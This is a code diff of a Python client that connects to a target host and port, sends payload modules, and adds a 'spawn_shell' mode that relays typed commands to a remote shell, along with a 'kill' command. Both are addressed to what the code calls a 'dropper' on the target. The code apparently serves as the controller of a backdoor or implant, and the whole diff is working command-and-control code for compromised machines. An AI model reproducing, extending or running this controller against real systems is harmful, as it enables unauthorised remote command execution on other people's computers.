@@ -3,28 +3,43 @@
 import socket
 import sys
 
+status = False
+
 try:
 	host = sys.argv[1]
 	port = sys.argv[2]
 	payload = sys.argv[3]
-	payload_source = open("modules/{0}".format(payload),"r").read().split("\n")[0]
-	print(host+":"+port+":"+payload)
-	print(payload_source)
+	if payload == "spawn_shell":
+		print "[+] spawning a bash shell on the target socket to your client"
+	elif payload == "kill":
+		print "[+] sending kill command to the dropper"
+	else:
+		payload_source = open("modules/{0}".format(payload),"r").read().split("\n")[0]
+		print(host+":"+port+":"+payload)
+		print(payload_source)
 except Exception as e:
 	print("Usage: {0} TARGET_HOST PORT PAYLOAD_MODULE".format(sys.argv[0]))
 	print(e)
 
 def main():
 	socket_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	try:
-		socket_.connect((host, int(float(port))))
+#	try:
+	socket_.connect((host, int(float(port))))
+	if payload == "kill":
+		socket_.sendall(payload.encode("utf-8"))
+	if payload == "spawn_shell":
+		command = raw_input("$ ")
+		socket_.sendall("shell-com:"+command.encode("utf-8"))
+		if command == "kill_shell": socket_.close(); sys.exit()
+		data=socket_.recv(1024)
+		print data
+	else:
 		socket_.sendall(payload_source.encode("utf-8"))
-		data = socket_.recv(1024)
-		socket_.close()
-	except Exception as e:
-		print("Exiting")
-		print(e)
-		exit()
+	socket_.close()
+	#except Exception as e:
+	#	print("Exiting")
+#		print(e)
+	exit()
 
 if __name__ == "__main__":
 	main()
